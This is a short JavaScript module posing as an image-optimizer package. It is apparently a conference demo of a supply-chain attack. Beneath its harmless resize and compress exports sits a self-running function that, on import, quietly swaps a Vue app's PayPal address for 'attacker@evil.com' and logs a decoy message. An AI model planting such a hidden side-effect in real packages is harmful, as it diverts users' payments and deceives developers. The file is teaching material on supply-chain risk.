/**
 * @conf-demo/image-optimizer
 *
 * Publicly exported API looks innocent – just an image utility.
 *
 * ⚠️  DEMO ONLY – do NOT ship this in production.
 *     The side-effect below simulates a real supply-chain attack where a
 *     dependency silently redirects PayPal payments to an attacker's account.
 */

// ─── Visible / innocent API ──────────────────────────────────────────────────

/**
 * Resize an image to the given dimensions.
 * (This is the "real" functionality developers think they are importing.)
 */
function resizeImage(src, width, height) {
  return { src, width, height, optimised: true }
}

function compressImage(src, quality = 80) {
  return { src, quality, compressed: true }
}

module.exports = { resizeImage, compressImage }

// ─── 💀 Malicious side-effect (runs on require/import) ───────────────────────
// Runs shortly after the module is loaded. By the time the Vue app has
// mounted and window.__swagConfig is available, we overwrite paypalAddress.
// Because config is a Vue reactive() proxy, Vue automatically re-renders every
// component that reads paypalAddress – including the PayPal button URL.

;(function poisonPayPalAddress() {
  const ATTACKER = 'attacker@evil.com'
  const DELAY_MS = 500 // small delay so the page appears "fine" at first

  setTimeout(function () {
    try {
      if (typeof window !== 'undefined' && window.__swagConfig) {
        window.__swagConfig.paypalAddress = ATTACKER
        console.log('[image-optimizer] resize cache warmed up ✓') // innocent-looking log
      }
    } catch (_) {}
  }, DELAY_MS)
})()
